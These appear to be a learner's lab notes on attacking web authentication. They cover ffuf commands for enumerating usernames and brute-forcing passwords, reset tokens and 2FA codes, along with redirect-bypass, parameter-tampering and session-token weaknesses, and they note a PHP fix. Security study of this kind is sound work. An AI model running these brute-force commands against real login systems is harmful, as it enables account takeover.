![[Pasted image 20240611220719.png]]

### Common Authentication Methods

- Knowledge-based authentication
- Ownership-based authentication
- Inherence-based authentication


| Knowledge                   | Ownership         | Inherence         |
| --------------------------- | ----------------- | ----------------- |
| Password                    | ID card           | Fingerprint       |
| PIN                         | Security Token    | Facial Pattern    |
| Answer to Security Question | Authenticator App | Voice Recognition |

# Bruteforce Attacks

## Enumerating Users

- responds differently to registered/valid and invalid inputs for authentication endpoints

![[Pasted image 20240611221602.png]]

![[Pasted image 20240611221611.png]]


- Enumerate usernames using ffuf

```shell
ffuf -w /opt/seclists/Usernames/xato-net-10-million-usernames.txt -u http:// 94.237.49.32:36757/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=admin" -fr "Unknown username"
```


### User Enumeration via Side-Channel Attacks

- the response timing, i.e., the time it takes for the web application's response to reach us
	- eg, if it checks for the userdb only for valid db rhen response time varies

### Brute-Forcing Passwords

- after finding username fuzz the password with the valid username
- filter the wordlist with password policies

```shell
grep '[[:upper:]]' /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

```


```shell
ffuf -w ./custom_wordlist.txt -u http://94.237.49.178:49729/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```



### Brute-Forcing Password Reset Tokens


![[Pasted image 20240611233705.png]]


-  need to create an account on the target web application, request a password reset token, and then analyze it.


**Example:**

```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.
```



- here a get request with parameter as toke is got so we can fuzz the token by generation numbers
- generate tokens


```shell
seq -w 0 9999 > tokens.txt
```




## Brute-Forcing 2FA Codes


![[Pasted image 20240612002024.png]]

![[Pasted image 20240612002032.png]]


```shell
pradyun2005@htb[/htb]$ seq -w 0 9999 > tokens.txt
```


```shell
pradyun2005@htb[/htb]$ ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

- after successfull auth every hit will be successfull



## Authentication Bypass via Direct Access


#### Direct Access

- find where after succesful login redirects to /admin.php
- access /admin.php directly without login page
- Does it redirect to index.php => modify response of http request 
- `302 FOUND to 200 OK` In response that redirecting

Why this happens ??

```php
if(!$_SESSION['active']) {
	header("Location: index.php");
}
```

include exit after header to mitigate
```php
	exit;
```


# Authentication Bypass via Parameter Modification

- check weather parameter is involved in authentication , how??
- remove/change the parameter value and check the functionality ,redirects to /index.php => parameter invloved in authentication
- brute the value to get higher priv
- idor

# Attacking Session Tokens

- collect different session tokes and analyze

```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

- only characters are changed easy to brute

- incremented session id

- base64,hex,url encoded session



gcnvvmcv4eqgm5fjc4ibt2crtq

